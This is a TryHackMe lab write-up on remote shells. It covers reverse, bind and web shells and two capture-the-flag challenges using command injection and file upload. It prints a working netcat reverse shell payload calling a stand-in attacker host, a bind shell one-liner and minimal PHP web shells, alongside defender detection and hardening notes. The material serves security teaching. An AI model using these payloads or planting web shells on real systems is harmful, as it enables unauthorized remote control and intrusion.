# Shell Overview

> **Room:** Shell Overview  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Author:** TryHackMe  
> **Writeup by:** Devdan Bayanaka

---

# Executive Summary

Shells are one of the fundamental concepts in offensive security. Almost every successful exploitation eventually aims to obtain a shell on the target system, allowing an attacker or penetration tester to execute commands remotely.

This room introduces the three primary shell types used in penetration testing:

- Reverse Shell
- Bind Shell
- Web Shell

In addition, it explains shell listeners, common reverse shell payloads, and demonstrates how real-world vulnerabilities such as **Command Injection** and **Unrestricted File Upload** can be exploited to gain remote command execution.

Understanding shells is an essential milestone before learning more advanced topics such as privilege escalation, persistence, lateral movement, Active Directory attacks, and post-exploitation.

---

# Learning Objectives

After completing this room, you should be able to:

- Understand what a shell is.
- Explain how shells interact with an operating system.
- Differentiate between local and remote shells.
- Understand Reverse Shells, Bind Shells, and Web Shells.
- Learn how shell listeners work.
- Understand common reverse shell payloads.
- Exploit Command Injection to obtain a reverse shell.
- Exploit an Unrestricted File Upload vulnerability using a web shell.
- Understand shell detection techniques from a defender's perspective.

---

# Prerequisites

Before starting this room, you should be comfortable with the following topics:

- Basic Linux command line
- Basic Networking (TCP/IP and Ports)
- HTTP Requests and Responses
- Basic Web Application Security
- Basic Bash, PHP, or Python scripting

---

# Why Learning Shells Matters

One of the biggest misconceptions among beginners is believing that exploitation is the final objective during a penetration test.

In reality, exploitation is usually only the beginning.

Most penetration testing engagements follow an attack chain similar to the following:

```text
Reconnaissance
        │
        ▼
Enumeration
        │
        ▼
Vulnerability Discovery
        │
        ▼
Exploitation
        │
        ▼
Obtain Shell
        │
        ▼
Privilege Escalation
        │
        ▼
Persistence
        │
        ▼
Lateral Movement / Pivoting
        │
        ▼
Objectives
```

Successfully exploiting a vulnerability often grants only **initial access**.

To continue interacting with the compromised system, attackers usually need to obtain a **shell**.

This is why penetration testers often say:

> **The goal of exploitation is code execution. The goal of code execution is obtaining a shell.**

---

# What Is a Shell?

A shell is a program that allows users to interact with an operating system.

Instead of communicating directly with the operating system kernel, users send commands to a shell, which interprets them and requests the operating system to execute them.

A simplified architecture looks like this:

```text
User
   │
   ▼
Shell (bash, sh, PowerShell)
   │
   ▼
Operating System
   │
   ▼
Hardware
```

Some of the most common shells include:

## Linux

- Bash
- sh
- Zsh
- Fish

## Windows

- Command Prompt (cmd.exe)
- Windows PowerShell

---

# Local Shell vs Remote Shell

## Local Shell

A local shell executes commands directly on the user's own computer.

Example:

```text
Keyboard
     │
     ▼
Terminal
     │
     ▼
Bash
     │
     ▼
Linux
```

This is the shell most Linux users interact with every day.

---

## Remote Shell

A remote shell allows commands to be executed on another machine through a network connection.

```text
Attacker
     │
 Internet
     │
Victim Shell
     │
Operating System
```

Instead of sitting in front of the victim's computer, the attacker remotely interacts with its operating system.

Remote shells are one of the primary objectives of many cyber attacks.

---

# Why Attackers Want a Shell

Once shell access is obtained, attackers can remotely control the compromised machine.

Typical post-exploitation activities include:

- Running operating system commands
- Enumerating users and services
- Reading sensitive files
- Searching for credentials
- Privilege Escalation
- Installing persistence mechanisms
- Deploying malware
- Pivoting to internal systems

Shell access transforms a simple vulnerability into full operating system interaction.

---

# Offensive Security Perspective

From a penetration tester's perspective, obtaining a shell is usually the beginning of the assessment rather than the end.

Typical workflow:

```text
Exploit
    │
    ▼
Shell Access
    │
    ├── System Enumeration
    ├── Privilege Escalation
    ├── Credential Harvesting
    ├── Persistence
    ├── Pivoting
    └── Post Exploitation
```

Almost every Hack The Box or TryHackMe machine eventually reaches this stage.

---

# Blue Team Perspective

For defenders, unexpected shell activity is a strong indicator of compromise.

For example:

```text
apache2
    │
    ▼
bash
```

or

```text
nginx
    │
    ▼
sh
```

A web server should normally serve HTTP requests—not spawn interactive shell processes.

Blue teams commonly monitor for:

- Shell processes started by web services
- Unexpected command execution
- Parent-child process relationships
- Suspicious outbound network connections
- Interactive shells created by service accounts

---

# Common Indicators of Compromise (IoCs)

Examples of suspicious behavior include:

- `/bin/bash` launched by Apache or Nginx
- `/bin/sh` spawned by PHP
- PowerShell running from web applications
- Reverse shell connections leaving the network
- Unknown listening ports
- Unexpected command execution by service accounts

Example process tree:

```text
apache2
    │
    ▼
php
    │
    ▼
bash
    │
    ▼
nc
```

This type of process hierarchy is highly suspicious and frequently indicates successful exploitation.

---

# Shells in the Cyber Kill Chain

Shells are commonly obtained immediately after exploitation.

```text
Recon
      │
      ▼
Enumeration
      │
      ▼
Exploit
      │
      ▼
Remote Code Execution
      │
      ▼
Get Shell
      │
      ▼
Privilege Escalation
      │
      ▼
Persistence
      │
      ▼
Lateral Movement
```

Notice that the shell acts as a bridge between **initial access** and **post-exploitation**.

Without shell access, many later attack stages become significantly more difficult.

---

# Skills Gained

After completing this room, you will strengthen your understanding of:

- Linux Shells
- Remote Command Execution (RCE)
- Reverse Shells
- Bind Shells
- Web Shells
- TCP Communication
- Shell Listeners
- HTTP-based Command Execution
- Command Injection
- Unrestricted File Upload vulnerabilities
- Basic Post-Exploitation methodology

These concepts serve as the foundation for more advanced topics, including:

- Linux Privilege Escalation
- Windows Privilege Escalation
- Active Directory
- Pivoting
- Lateral Movement
- Red Team Operations

---

# Key Takeaways

- A shell is the interface between a user and the operating system.
- In cybersecurity, the term *shell* usually refers to remote command-line access to a compromised machine.
- Exploitation is rarely the final objective; obtaining a shell enables post-exploitation activities.
- Remote shells allow attackers to execute commands, enumerate systems, escalate privileges, maintain persistence, and pivot through networks.
- Detecting unauthorized shell activity is one of the primary objectives of modern endpoint detection and response (EDR) solutions.

---

# Next Section

In the next section, we will explore **Reverse Shells** in depth.

We will learn:

- How Reverse Shells work internally.
- Why they are more common than Bind Shells.
- How Netcat acts as a listener.
- How TCP connections are established.
- How reverse shell payloads expose an interactive shell over the network.

# Reverse Shell

A **Reverse Shell** is one of the most common techniques used by attackers and penetration testers to gain remote command execution on a compromised system.

Unlike a traditional client-server model, the compromised machine initiates the connection back to the attacker, allowing the attacker to remotely control the target system.

Because the connection originates from the victim, reverse shells often bypass firewall rules that block inbound connections while allowing outbound traffic.

---

# Why Is It Called a Reverse Shell?

Normally, when we think about remote access, we imagine the attacker connecting to the victim.

```text
Attacker ─────────────► Victim
```

This is exactly how a **Bind Shell** works.

However, a Reverse Shell reverses this relationship.

Instead of the attacker connecting to the victim, the victim connects back to the attacker.

```text
Victim ─────────────► Attacker
```

This is why it is called a **Reverse Shell**, or sometimes a **Connect Back Shell**.

---

# Why Reverse Shells Are So Popular

Modern enterprise networks typically implement firewalls that distinguish between:

- Inbound traffic
- Outbound traffic

Most organizations configure their firewall similarly to the following:

```text
Inbound Connections
        │
        ▼
Blocked
```

```text
Outbound Connections
        │
        ▼
Allowed
```

For example, employees must be able to browse websites.

```text
Employee PC
      │
HTTPS (443)
      ▼
Internet
```

Blocking every outbound connection would make normal business impossible.

Attackers take advantage of this behavior by making the compromised machine establish the connection.

Since the victim is making an outbound connection, the firewall often allows it.

---

# How Reverse Shells Work

The reverse shell process can be broken into four simple steps.

## Step 1 — Attacker Creates a Listener

The attacker prepares a program that waits for incoming connections.

For example:

```bash
nc -lvnp 443
```

At this stage, the attacker is simply waiting.

```text
Attacker
    │
Listening...
```

---

## Step 2 — The Victim Executes a Reverse Shell Payload

After exploiting a vulnerability (such as Command Injection or Remote Code Execution), the attacker executes a reverse shell payload on the victim.

Instead of displaying output locally, the payload creates a TCP connection to the attacker's machine.

```text
Victim
     │
TCP Connection
     ▼
Attacker
```

---

## Step 3 — TCP Connection Is Established

Once the victim reaches the listener successfully, both machines are connected.

```text
Victim Shell
      │
 TCP Connection
      │
Attacker Listener
```

---

## Step 4 — Interactive Shell

The attacker can now execute commands remotely.

```text
Attacker Terminal

whoami
pwd
ls
cat file.txt
```

Every command actually runs on the victim machine.

---

# Setting Up a Netcat Listener

The room uses **Netcat (nc)** as the listener.

Command:

```bash
nc -lvnp 443
```

Example output:

```text
listening on [any] 443 ...
```

Let's examine each option.

---

## nc

Netcat is often referred to as:

> **The Swiss Army Knife of Networking**

It supports many networking operations, including:

- Reverse Shells
- Bind Shells
- File Transfer
- Port Scanning
- Banner Grabbing
- TCP Connections
- UDP Connections

---

## -l

**Listen Mode**

Instead of connecting to another host, Netcat waits for an incoming connection.

Think of it as answering a phone call.

---

## -v

Verbose Mode

Displays additional information such as:

- Connection status
- Client IP address
- Port number

Example:

```text
connect to [10.10.10.5] from [10.10.13.37]
```

---

## -n

No DNS Resolution

Without this option, Netcat attempts to resolve hostnames using DNS.

Using `-n` forces Netcat to work directly with IP addresses, making the connection slightly faster.

---

## -p

Specifies the listening port.

Example:

```bash
443
```

Netcat waits for connections on TCP port 443.

---

# Why Use Port 443?

Technically, any available TCP port can be used.

However, attackers frequently choose common ports such as:

- 80 (HTTP)
- 443 (HTTPS)
- 53 (DNS)
- 8080 (HTTP Alternative)
- 445 (SMB)

These ports are commonly allowed through firewalls, making malicious traffic blend in with legitimate network activity.

---

# Reverse Shell Payload

After the listener is running, the attacker executes a reverse shell payload on the compromised system.

Example:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f
```

Although it appears complicated, the payload performs three primary actions:

1. Creates a communication channel.
2. Launches an interactive shell.
3. Connects the shell to the attacker's listener.

---

# Understanding the Payload

## Remove Existing FIFO

```bash
rm -f /tmp/f
```

Deletes any existing named pipe.

The `-f` flag suppresses errors if the file does not exist.

---

## Create a Named Pipe

```bash
mkfifo /tmp/f
```

Creates a **FIFO (First-In, First-Out)** named pipe.

Named pipes allow two processes to communicate.

```text
Process A
     │
 FIFO Pipe
     │
Process B
```

---

## Read Data From the Pipe

```bash
cat /tmp/f
```

Reads commands arriving through the named pipe.

---

## Launch an Interactive Shell

```bash
sh -i
```

Starts an interactive shell.

The `-i` option enables interactive mode, allowing multiple commands to be executed during the session.

---

## Redirect Standard Error

```bash
2>&1
```

Linux processes have three standard streams:

| File Descriptor | Stream |
|----------------:|--------|
| 0 | Standard Input (stdin) |
| 1 | Standard Output (stdout) |
| 2 | Standard Error (stderr) |

The expression:

```bash
2>&1
```

redirects error messages to standard output.

As a result, both successful output and error messages are sent back to the attacker.

---

## Connect Using Netcat

```bash
nc ATTACKER_IP 443
```

Creates a TCP connection to the attacker's listener.

This is the actual "reverse" part of the reverse shell.

---

## Complete Communication Loop

Finally,

```bash
>/tmp/f
```

redirects incoming commands back into the named pipe.

The communication flow becomes:

```text
Attacker
     │
     ▼
Netcat
     │
     ▼
Named Pipe
     │
     ▼
Shell
     │
     ▼
Named Pipe
     │
     ▼
Netcat
     │
     ▼
Attacker
```

This continuous loop enables a fully interactive shell.

---

# Successful Reverse Shell

Once the payload executes successfully, Netcat receives the connection.

Example:

```text
attacker@kali:~$ nc -lvnp 443

listening on [any] 443 ...
connect to [10.4.99.209] from [10.10.13.37] 59964

target@tryhackme:~$
```

The prompt changes to the victim's shell.

Commands typed on the attacker's machine are now executed on the target.

---

# Red Team Perspective

Reverse shells are commonly used after obtaining **Remote Code Execution (RCE)** through vulnerabilities such as:

- Command Injection
- File Upload Vulnerabilities
- Server-Side Template Injection (SSTI)
- Deserialization
- Buffer Overflow
- Remote Code Execution vulnerabilities

Their purpose is to convert one-time command execution into a persistent interactive session.

---

# Blue Team Perspective

Defenders commonly monitor for indicators such as:

- Bash creating outbound TCP connections
- Netcat processes initiating external communications
- Web server processes spawning shell interpreters
- Unexpected outbound traffic to uncommon IP addresses
- Parent-child process relationships such as:

```text
apache2
    │
    ▼
bash
    │
    ▼
nc
```

These behaviors frequently indicate successful exploitation.

---

# Key Takeaways

- Reverse Shells are the most common method of obtaining remote command execution.
- The victim initiates the TCP connection to the attacker.
- Firewalls often allow outbound connections, making Reverse Shells more reliable than Bind Shells.
- Netcat is commonly used as a listener waiting for incoming shell connections.
- A reverse shell payload connects the shell's input and output to the attacker's listener, creating an interactive remote terminal.

---

# Next Section

In the next section, we will explore **Bind Shells**, compare them with Reverse Shells, examine their advantages and disadvantages, and learn why they are used less frequently in modern penetration testing.

# Bind Shell

Unlike a Reverse Shell, where the compromised machine connects back to the attacker, a **Bind Shell** works in the opposite direction.

The compromised host opens a network port and waits for an incoming connection.

When the attacker connects to that port, the shell is exposed, allowing remote command execution.

---

# What Is a Bind Shell?

A Bind Shell is a remote shell that **binds** a shell process to a listening TCP port.

Instead of creating an outbound connection, the victim waits for someone to connect.

```text
Attacker
     │
     │ TCP Connection
     ▼
Victim (Listening)
     │
     ▼
Shell
```

The attacker simply connects to the listening port to obtain an interactive shell.

---

# Reverse Shell vs Bind Shell

Although both techniques ultimately provide remote command execution, they differ in one critical aspect:

| Reverse Shell | Bind Shell |
|---------------|------------|
| Victim initiates the connection | Attacker initiates the connection |
| Attacker listens | Victim listens |
| Better at bypassing firewalls | Easier to detect |
| More common in real-world attacks | Less commonly used today |

The difference can be visualized as follows:

## Reverse Shell

```text
Victim ----------------------► Attacker
        Connect Back
```

## Bind Shell

```text
Attacker --------------------► Victim
         Connect
```

---

# Why Is It Called "Bind"?

The shell is **bound** to a network port.

For example:

```text
bash
   │
   ▼
TCP Port 8080
   │
   ▼
Listening...
```

Anyone able to connect to port **8080** will gain access to the shell.

---

# When Are Bind Shells Useful?

Bind Shells may still be useful in situations such as:

- Internal penetration tests
- Capture The Flag (CTF) challenges
- Flat internal networks
- Environments where outbound connections are blocked

However, they are less practical on Internet-facing systems because firewalls usually block unsolicited inbound connections.

---

# Why Reverse Shells Are Preferred

Modern enterprise networks commonly block inbound traffic.

```text
Internet
      │
Firewall
      │
Internal Network
```

An attacker attempting to connect directly to a compromised host often encounters:

```text
Connection Refused
```

or

```text
Connection Timed Out
```

Since Reverse Shells initiate outbound traffic, they usually have a much higher success rate.

---

# How Bind Shells Work

The process consists of three simple steps.

## Step 1 — Victim Opens a Listening Port

After exploiting the system, the attacker executes a Bind Shell payload.

The victim begins listening on a TCP port.

```text
Victim

Listening...

TCP Port 8080
```

---

## Step 2 — Attacker Connects

Instead of waiting, the attacker actively connects to the victim.

```text
Attacker
      │
      ▼
Victim
```

---

## Step 3 — Interactive Shell

Once connected, the attacker receives an interactive shell.

```text
Attacker

target@machine:~$
```

Commands entered on the attacker's machine execute on the victim.

---

# Bind Shell Payload

Example:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```

Notice that most of the payload is identical to the Reverse Shell payload.

The major difference is the Netcat command.

---

# Understanding the Payload

## Remove Existing FIFO

```bash
rm -f /tmp/f
```

Deletes any previous named pipe.

---

## Create Named Pipe

```bash
mkfifo /tmp/f
```

Creates a FIFO used for communication between Bash and Netcat.

---

## Read Commands

```bash
cat /tmp/f
```

Reads incoming commands.

---

## Interactive Bash

```bash
bash -i
```

Starts an interactive Bash shell.

---

## Redirect Errors

```bash
2>&1
```

Redirects **stderr** to **stdout**, ensuring error messages are also returned to the attacker.

---

## Start Listening

```bash
nc -l 0.0.0.0 8080
```

This is the important difference.

Instead of connecting outward, Netcat listens.

### Option Breakdown

#### `-l`

Listen mode.

#### `0.0.0.0`

Listen on every available network interface.

For example:

```text
127.0.0.1
192.168.1.20
10.10.10.15
```

The shell becomes accessible through all interfaces.

#### `8080`

TCP listening port.

Ports above **1024** are typically chosen because they do not require root privileges.

---

# Connecting to the Bind Shell

Once the victim starts listening, the attacker connects using Netcat.

Example:

```bash
nc -nv TARGET_IP 8080
```

Example output:

```text
(UNKNOWN) [10.10.13.37] 8080 open

target@tryhackme:~$
```

The attacker now has an interactive shell.

---

# Shell Listeners

A Reverse Shell cannot function unless something is waiting for the incoming connection.

That program is called a **Listener**.

Several popular listener tools exist.

---

# Netcat (nc)

The most commonly used listener.

Example:

```bash
nc -lvnp 443
```

Advantages:

- Lightweight
- Installed on many Linux systems
- Easy to use

Limitations:

- Basic terminal experience
- No command history
- No arrow key support

---

# Rlwrap

Example:

```bash
rlwrap nc -lvnp 443
```

Many beginners mistakenly think **rlwrap** is another listener.

It is not.

Instead:

```text
rlwrap
    │
    ▼
Netcat
    │
    ▼
Reverse Shell
```

Rlwrap simply improves the interactive experience.

Features include:

- Command history
- Arrow key navigation
- Line editing
- Better terminal usability

---

# Ncat

Ncat is the enhanced version of Netcat developed by the Nmap Project.

Example:

```bash
ncat -lvnp 443
```

Additional features include:

- SSL/TLS support
- IPv6 support
- Proxy support
- Better connection handling

Encrypted listener example:

```bash
ncat --ssl -lvnp 443
```

This encrypts communication between the victim and attacker.

---

# Socat

Socat (**SOcket CAT**) is one of the most flexible networking utilities.

Example:

```bash
socat -d -d TCP-LISTEN:443 STDOUT
```

Option breakdown:

| Option | Description |
|---------|-------------|
| `-d -d` | Increase verbosity |
| `TCP-LISTEN:443` | Listen on TCP port 443 |
| `STDOUT` | Print received data to the terminal |

Unlike Netcat, Socat can bridge many different communication channels.

Examples include:

- TCP ↔ TCP
- TCP ↔ File
- TCP ↔ Bash
- TCP ↔ Serial Port
- TCP ↔ SSL

Because of this flexibility, Socat is frequently used in advanced penetration testing.

---

# Comparing Listener Tools

| Tool | Advantages | Limitations |
|------|------------|-------------|
| Netcat | Simple and widely available | Minimal features |
| Rlwrap | Adds history and editing | Depends on Netcat |
| Ncat | SSL, IPv6, Proxy support | Not always installed |
| Socat | Extremely flexible | More complex syntax |

---

# Shell Payloads

A **Shell Payload** is the command or script executed on the compromised machine to expose a shell.

Depending on the environment, payloads may be written in different languages.

Common payload categories include:

- Bash
- PHP
- Python
- Perl
- BusyBox
- Telnet
- AWK

Although the syntax differs, nearly every reverse shell payload follows the same workflow.

```text
Create Socket
      │
      ▼
Connect to Attacker
      │
      ▼
Launch Shell
      │
      ▼
Redirect Input & Output
      │
      ▼
Interactive Session
```

---

# Why Are There So Many Payloads?

Every target system is different.

Some systems include:

- Bash

Others may only include:

- Python

Some embedded devices only contain:

- BusyBox

A penetration tester should **never memorize payloads**.

Instead, the proper approach is:

1. Enumerate the target.
2. Identify available interpreters.
3. Choose the appropriate payload.

Typical enumeration commands include:

```bash
which bash
which python
which python3
which php
which perl
which nc
```

The payload depends entirely on what is available on the compromised machine.

---

# Red Team Perspective

Bind Shells are less common today but still appear in:

- Internal penetration tests
- Flat corporate networks
- Capture The Flag challenges
- Environments where outbound traffic is restricted

Listener selection depends on operational requirements.

Simple testing may only require Netcat, while more advanced engagements often benefit from tools such as Ncat or Socat.

---

# Blue Team Perspective

Security teams monitor for:

- Unexpected listening ports
- Netcat or Socat processes
- Shells bound to network sockets
- Unusual outbound TCP connections
- Suspicious parent-child process relationships

Bind Shells are generally easier to detect because the compromised machine must continuously expose a listening service.

---

# Key Takeaways

- Bind Shells expose a shell by opening a listening port on the victim.
- Reverse Shells are generally preferred because they bypass inbound firewall restrictions.
- A shell listener is required to receive incoming reverse shell connections.
- Netcat, Rlwrap, Ncat, and Socat all serve different purposes when handling remote shells.
- Reverse shell payloads may use Bash, PHP, Python, BusyBox, or other interpreters depending on the target environment.

---

# Next Section

In the next section, we will explore **Web Shells**, understand how they execute operating system commands through HTTP requests, and compare them with traditional Reverse and Bind Shells before moving into the practical exploitation challenges.

# Web Shell

A **Web Shell** is a script written in a server-side programming language that allows an attacker to execute operating system commands through a web server.

Unlike Reverse Shells and Bind Shells, which communicate directly over TCP connections, a Web Shell communicates through **HTTP requests**.

Because web shells blend into normal web traffic, they are extremely popular during web application attacks.

---

# What Is a Web Shell?

A web shell is simply a file uploaded or placed on a web server that executes commands received from HTTP requests.

A simplified architecture looks like this:

```text
Attacker
     │
HTTP Request
     │
     ▼
Web Server
     │
     ▼
Web Shell (PHP)
     │
     ▼
Operating System
     │
     ▼
Command Output
     │
HTTP Response
     ▼
Attacker
```

Instead of connecting through Netcat, every command is executed through the web server itself.

---

# How Web Shells Work

Suppose an attacker successfully uploads the following PHP file.

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

This simple script performs three actions:

1. Checks whether a parameter named **cmd** exists.
2. Passes its value to the Linux **system()** function.
3. Displays the command output in the HTTP response.

---

# Understanding the Code

## Reading URL Parameters

```php
$_GET['cmd']
```

The `$_GET` superglobal contains values sent through the URL.

Example:

```text
shell.php?cmd=whoami
```

PHP reads:

```php
$_GET['cmd']
```

Value:

```text
whoami
```

---

## Checking Whether the Parameter Exists

```php
isset($_GET['cmd'])
```

This prevents errors if the user visits:

```text
shell.php
```

without providing a command.

---

## Executing Operating System Commands

```php
system($_GET['cmd']);
```

This executes whatever command is supplied.

For example:

```text
http://victim/uploads/shell.php?cmd=whoami
```

Internally becomes:

```bash
system("whoami")
```

Output:

```text
www-data
```

---

# Why Does It Execute as www-data?

The PHP interpreter runs under the web server.

Typical process tree:

```text
Browser
     │
     ▼
Apache / Nginx
     │
     ▼
PHP
     │
     ▼
Linux
     │
     ▼
www-data
```

Since Apache commonly runs as the **www-data** user, the shell inherits the same privileges.

This is why attackers often perform **Privilege Escalation** after obtaining a web shell.

---

# Web Shell Communication

Unlike Reverse Shells, every command requires a separate HTTP request.

For example:

```text
GET /shell.php?cmd=whoami
```

↓

Response

```text
www-data
```

Next command:

```text
GET /shell.php?cmd=pwd
```

↓

Response

```text
/var/www/html/uploads
```

Every command follows the request-response cycle.

---

# Web Shell vs Reverse Shell

| Web Shell | Reverse Shell |
|------------|---------------|
| Uses HTTP | Uses TCP |
| Browser acts as the interface | Terminal acts as the interface |
| One request per command | Persistent interactive session |
| Easier to hide inside a web application | Better interactive experience |
| No listener required | Requires a listener |

---

# How Attackers Obtain a Web Shell

A web shell is rarely uploaded legitimately.

Instead, attackers exploit vulnerabilities such as:

- Unrestricted File Upload
- Command Injection
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Remote Code Execution
- Stolen FTP or SSH credentials

Once uploaded, the attacker simply visits the file through a browser.

---

# Popular Web Shells

Several well-known web shells exist.

Examples include:

## p0wny-shell

Features:

- Single PHP file
- Lightweight
- Interactive terminal
- Command execution

---

## b374k

Features:

- File manager
- File upload
- File editing
- Command execution
- Database interaction

---

## c99 Shell

One of the oldest and most famous PHP web shells.

Capabilities include:

- File management
- Command execution
- Network tools
- Database access
- Environment information

Because these shells are widely known, many antivirus and endpoint detection products include signatures for detecting them.

---

# Practical Challenge 1 — Command Injection → Reverse Shell

## Objective

Exploit the vulnerable **Command Injection** application to obtain a **Reverse Shell**, then locate and read the flag stored in the root (`/`) directory.

---

# Scenario

The vulnerable application was available at:

```text
http://<TARGET_IP>:8081
```

The page contained a **Hash the File** feature.

Instead of safely validating user input, the application was vulnerable to **Command Injection**, allowing arbitrary operating system commands to be executed.

---

# Attack Overview

The attack followed the workflow below.

```text
Command Injection
        │
        ▼
Reverse Shell Payload
        │
        ▼
Victim Connects Back
        │
        ▼
Netcat Listener
        │
        ▼
Interactive Shell
        │
        ▼
Locate Flag
```

---

# Step 1 — Start the Listener

Before executing the payload, a listener must be waiting for the incoming reverse shell connection.

Command used:

```bash
nc -lvnp 4444
```

Output:

```text
listening on [any] 4444...
```

At this point, the attacker's machine is waiting for an incoming TCP connection.

---

# Step 2 — Exploit the Command Injection

The vulnerable input field intended for hashing a filename was abused to execute a reverse shell payload.

Once submitted, the payload instructed the victim machine to initiate a TCP connection back to the attacker's Netcat listener.

When successful, Netcat displayed a connection similar to:

```text
connect to [ATTACKER_IP] from [TARGET_IP]
```

An interactive shell was then available.

---

# Step 3 — Enumerate the System

After obtaining shell access, basic enumeration was performed.

Listing the current directory:

```bash
ls -la
```

The flag was not located in the current working directory because the shell started inside the web application's directory.

---

# Step 4 — Locate the Flag

The root directory was searched for files beginning with **flag**.

Command:

```bash
find / -maxdepth 1 -type f -name "flag*"
```

Example output:

```text
/flag.txt
```

---

# Step 5 — Read the Flag

Finally, the flag was displayed.

Command:

```bash
cat /flag.txt
```

The flag was successfully retrieved, completing the first challenge.

---

# Lessons Learned

This challenge demonstrates a common real-world attack chain.

```text
Command Injection
        │
        ▼
Remote Code Execution
        │
        ▼
Reverse Shell
        │
        ▼
System Enumeration
        │
        ▼
Read Sensitive Files
```

Rather than executing individual commands one by one through the vulnerable application, obtaining a reverse shell provides a far more efficient and interactive environment for post-exploitation.

---

# Red Team Notes

From an offensive security perspective, Command Injection vulnerabilities are highly valuable because they often lead directly to **Remote Code Execution (RCE)**.

After achieving RCE, attackers commonly:

- Establish a Reverse Shell
- Enumerate the operating system
- Search for credentials
- Escalate privileges
- Pivot to additional systems

Obtaining the shell is usually only the beginning of the attack.

---

# Blue Team Notes

This vulnerability could be prevented through several defensive measures:

- Never pass user input directly to operating system commands.
- Use safe APIs instead of shell execution whenever possible.
- Validate and sanitize user input.
- Apply the principle of least privilege to web server accounts.
- Monitor for web server processes spawning shell interpreters such as `bash` or `sh`.

---

# Next Section

In the next section, we will exploit an **Unrestricted File Upload** vulnerability by uploading a **PHP Web Shell**, executing operating system commands through HTTP requests, and retrieving the second flag.

# Practical Challenge 2 — Unrestricted File Upload → Web Shell

## Objective

Exploit an **Unrestricted File Upload** vulnerability to upload a **PHP Web Shell**, execute operating system commands through HTTP requests, and retrieve the flag stored in the root (`/`) directory.

---

# Scenario

The vulnerable application was available at:

```text
http://<TARGET_IP>:8082
```

The application allowed users to upload files but failed to properly validate file types before storing them inside the web root.

Because PHP files were accepted and executed by the web server, an attacker could upload a malicious PHP script and gain remote command execution.

---

# Attack Overview

The attack followed the workflow below.

```text
Upload PHP Web Shell
        │
        ▼
Web Server Stores File
        │
        ▼
Access Web Shell via Browser
        │
        ▼
Execute Linux Commands
        │
        ▼
Locate Flag
        │
        ▼
Read Flag
```

Unlike the previous challenge, no Reverse Shell or Netcat listener was required.

Communication occurred entirely through HTTP requests.

---

# Step 1 — Create a PHP Web Shell

A simple PHP web shell was created.

```php
<?php
system($_GET['cmd']);
?>
```

This script performs one simple task.

Whenever the browser sends a request containing the **cmd** parameter, PHP executes the supplied command using the Linux `system()` function.

For example:

```text
shell.php?cmd=whoami
```

Internally becomes:

```bash
system("whoami")
```

---

# Step 2 — Upload the Web Shell

The file was saved as:

```text
shell.php
```

It was then uploaded through the vulnerable file upload functionality.

Because the application failed to restrict executable file types, the PHP file was successfully stored on the server.

---

# Step 3 — Verify Code Execution

After uploading the file, it was accessed through the browser.

Example:

```text
http://<TARGET_IP>:8082/uploads/shell.php?cmd=whoami
```

Response:

```text
www-data
```

This confirmed that:

- The PHP file was successfully uploaded.
- The web server executed the PHP code.
- Operating system commands could now be executed remotely.

---

# Why Is the User "www-data"?

The web server executes PHP scripts using its own service account.

Typical process flow:

```text
Browser
     │
HTTP Request
     │
     ▼
Apache / Nginx
     │
     ▼
PHP
     │
     ▼
Linux
     │
     ▼
www-data
```

Since Apache commonly runs as **www-data**, every command executed through the web shell inherits those privileges.

---

# Step 4 — Enumerate the File System

The next objective was locating the flag.

The following request listed the contents of the root directory.

```text
http://<TARGET_IP>:8082/uploads/shell.php?cmd=ls%20-la%20/
```

Response (example):

```text
bin
boot
dev
etc
flag.txt
home
lib
media
...
```

The listing revealed that **flag.txt** existed in the root directory.

---

# Understanding URL Encoding

One important observation during this challenge is the use of:

```text
%20
```

The browser cannot include literal spaces inside URLs.

Instead, spaces must be URL encoded.

For example:

Normal command:

```text
ls -la /
```

URL encoded:

```text
ls%20-la%20/
```

Similarly,

```text
cat /flag.txt
```

becomes

```text
cat%20/flag.txt
```

URL encoding is a fundamental concept in HTTP communication and is commonly encountered during web application penetration testing.

---

# Step 5 — Read the Flag

After identifying the flag's location, the final request displayed its contents.

Request:

```text
http://<TARGET_IP>:8082/uploads/shell.php?cmd=cat%20/flag.txt
```

The web shell executed:

```bash
cat /flag.txt
```

The flag was successfully returned in the HTTP response.

This completed the second challenge.

---

# Why No Listener Was Needed

Unlike Reverse Shells, Web Shells communicate entirely through HTTP.

Every command follows the standard request-response model.

```text
Browser
      │
HTTP Request
      │
      ▼
Web Shell
      │
      ▼
Linux Command
      │
      ▼
HTTP Response
      │
      ▼
Browser
```

There is no persistent TCP connection.

Instead, every command generates a brand-new HTTP request.

---

# Reverse Shell vs Web Shell

| Reverse Shell | Web Shell |
|---------------|-----------|
| Uses TCP | Uses HTTP |
| Requires a listener | Uses a web browser |
| Interactive session | One request per command |
| Better user experience | Easier to deploy |
| Persistent connection | Request-response communication |

Because of these differences, attackers often upload a Web Shell first and then use it to execute a Reverse Shell payload.

The workflow commonly looks like this:

```text
Upload Web Shell
        │
        ▼
Execute Reverse Shell Payload
        │
        ▼
Victim Connects Back
        │
        ▼
Interactive Reverse Shell
```

This combines the convenience of file upload exploitation with the usability of an interactive shell.

---

# Lessons Learned

This challenge demonstrates a classic web application attack chain.

```text
Unrestricted File Upload
            │
            ▼
Upload Web Shell
            │
            ▼
Remote Command Execution
            │
            ▼
System Enumeration
            │
            ▼
Read Sensitive Files
```

Even a very small PHP script can provide complete command execution if the server executes uploaded files.

This highlights why unrestricted file uploads are considered one of the most dangerous web application vulnerabilities.

---

# Red Team Notes

File upload vulnerabilities are among the most valuable findings during web application penetration tests.

After successfully uploading a Web Shell, attackers typically:

- Enumerate the operating system.
- Upload additional tools.
- Execute Reverse Shell payloads.
- Escalate privileges.
- Establish persistence.
- Pivot to other internal systems.

In many real-world intrusions, the Web Shell serves only as the initial foothold before transitioning to a fully interactive Reverse Shell.

---

# Blue Team Notes

Several security controls can prevent this attack.

**Secure file upload validation**

- Allow only approved file extensions.
- Validate MIME types.
- Verify file signatures (magic bytes).
- Rename uploaded files.
- Store uploads outside the web root.

**Server configuration**

- Disable PHP execution inside upload directories.
- Restrict executable permissions.
- Apply the principle of least privilege.

**Detection**

Security teams should monitor for:

- Newly uploaded PHP files.
- Web server processes executing operating system commands.
- HTTP requests containing suspicious parameters such as:

```text
?cmd=
```

- Functions including:

